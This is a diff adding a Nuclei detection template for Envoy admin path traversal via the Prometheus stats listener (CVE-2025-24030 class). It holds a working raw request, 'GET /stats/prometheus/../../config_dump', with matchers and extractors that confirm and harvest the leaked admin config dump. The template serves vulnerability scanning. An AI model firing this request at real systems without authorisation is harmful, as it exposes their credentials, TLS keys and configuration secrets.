@@ -1,0 +1,65 @@
+# gap: envoy-admin-traversal-stats
+id: envoy-admin-traversal-stats
+
+info:
+  name: Envoy Admin Path Traversal via Prometheus Stats Listener (CVE-2025-24030 Class)
+  author: TyrusRC
+  severity: critical
+  description: |
+    Detects path-traversal admin exposure via the Envoy / Envoy Gateway
+    Prometheus stats listener — the bug class formalized by CVE-2025-24030
+    (Envoy Gateway < 1.2.6, GHSA-j777-63hf-hx76). When the Envoy admin
+    interface is run with --path-as-is and the Prometheus stats listener
+    proxies arbitrary admin paths via /stats/prometheus/<dot-dot>, an
+    unauthenticated attacker reaches the otherwise-localhost-only admin
+    interface and reads BootstrapConfigDump. The class lesson: any
+    unauthenticated stats / metrics endpoint that proxies to admin
+    without sanitizing path traversal exposes secrets and credentials,
+    leaks TLS keys, and permits arbitrary file read of admin config
+    state.
+
+    The probe sends a raw HTTP/1.1 request preserving the literal
+    `../../config_dump` segment (Nuclei `unsafe: true`) and matches the
+    canonical Envoy BootstrapConfigDump protobuf-typed JSON. The match
+    is independent of vendor version and replays on the next traversal
+    primitive in the Envoy / Istio / Envoy Gateway ecosystem.
+  reference:
+    - https://github.com/envoyproxy/gateway/security/advisories/GHSA-j777-63hf-hx76
+    - https://www.envoyproxy.io/docs/envoy/latest/operations/admin.html
+  tags: custom,exposures,envoy,proxy,admin,traversal,disclosure,cwe-22
+
+http:
+  - raw:
+      - |+
+        GET /stats/prometheus/../../config_dump HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+
+    unsafe: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - '"@type"\s*:\s*"type\.googleapis\.com/envoy\.admin\.v3\.(Bootstrap)?ConfigDump"'
+      - type: word
+        part: body
+        words:
+          - '"configs"'
+
+    extractors:
+      - type: regex
+        part: body
+        name: envoy-version
+        regex:
+          - '"version"\s*:\s*"([^"]+)"'
+        group: 1
+      - type: kval
+        part: header
+        kval:
+          - "Server"
